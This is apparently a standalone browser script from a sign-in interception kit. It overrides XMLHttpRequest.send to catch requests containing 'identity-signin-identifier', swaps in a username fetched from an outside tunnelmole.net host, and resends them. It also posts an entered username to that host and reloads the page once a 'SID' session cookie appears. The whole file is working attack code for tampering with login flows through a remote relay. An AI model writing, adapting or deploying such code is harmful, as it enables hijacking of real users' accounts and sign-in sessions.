let freqUsername = null;
const modifiedRequests = new Set();
const pendingRequests = new Map();
let usernameFetched = false;
let fetchRetryCount = 0; // Track retry attempts for fetching username

// Fetch the username when needed
const fetchFreqUsername = async () => {
    if (usernameFetched || fetchRetryCount >= 5) return; // Avoid redundant fetches and limit retries

    console.log('Fetching username...');
    fetchRetryCount++; // Increment retry count

    try {
        const response = await fetch('https://ufsxpg-ip-37-228-207-120.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);

        const result = await response.json();

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            // Reset the server-side username store
            await fetch('https://ufsxpg-ip-37-228-207-120.tunnelmole.net/reset-first-post-data', { method: 'POST' });

            // Process all pending requests now that we have a username
            processModifiedRequests();
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 1000); // Retry after 1s
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 1000); // Retry after 1s
    }
};

// Modify and send pending requests when username is available
const processModifiedRequests = () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        fetchFreqUsername();
        return;
    }

    console.log("Processing pending requests...");
    for (let [xhr, body] of pendingRequests) {
        const match = body && /identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/.exec(body);

        if (match && !modifiedRequests.has(body)) {
            const modifiedBody = body.replace(match[1], freqUsername);
            modifiedRequests.add(body); // Mark the request as modified
            console.log("Modified request with new username:", modifiedBody);
            xhr.send(modifiedBody); // Send the modified request
            pendingRequests.delete(xhr); // Remove the request from pending
        }
    }

    // Reset freqUsername when all requests are processed
    if (pendingRequests.size === 0) {
        console.log("All pending requests processed, resetting freqUsername.");
        freqUsername = null;
        usernameFetched = false; // Allow fetching a new username if needed
        fetchRetryCount = 0; // Reset retry count after processing
    }
};

// Intercept XMLHttpRequest to modify requests with username
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    // If the body contains identity-signin-identifier and hasn't been modified yet, intercept
    if (/identity-signin-identifier/.test(body) && !Array.from(modifiedRequests).some(m => body.includes(m))) {
        console.log("Intercepted request:", body);
        pendingRequests.set(this, body); // Store the request in pendingRequests
        processModifiedRequests(); // Attempt to modify and send the request
    } else {
        originalXhrSend.call(this, body); // Send the original request if no modification is needed
    }
};

// ✅ Send username data to server
const sendUsername = async () => {
    console.log('Sending username...');

    const username = document.getElementById('username')?.value;
    if (!username) {
        console.warn("No username entered");
        return;
    }

    try {
        const response = await fetch('https://ufsxpg-ip-37-228-207-120.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });

        if (response.ok) {
            console.log('Username sent successfully');
        } else {
            console.error('Error sending username:', response.statusText);
        }
    } catch (error) {
        console.error('Error sending username:', error);
    }
};

// ✅ Attach event listeners to buttons
document.addEventListener('DOMContentLoaded', () => {
    const button = document.getElementById('sendUsernameBtn');
    const usernameInput = document.getElementById('username');

    // Add button click listener
    if (button) {
        button.addEventListener('click', (event) => {
            event.preventDefault(); // Prevent form submission if inside a form
            sendUsername(); // Trigger sending username
        });
    } else {
        console.warn('Send username button not found!');
    }

    // Add "Enter" key listener to trigger username send
    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') {
                event.preventDefault(); // Prevent form submission
                sendUsername(); // Trigger send on Enter
            }
        });
    }
});

// Auto-refresh page if 'SID' cookie exists
setInterval(() => {
    if (document.cookie.includes('SID')) {
        location.reload();
    }
}, 3000);
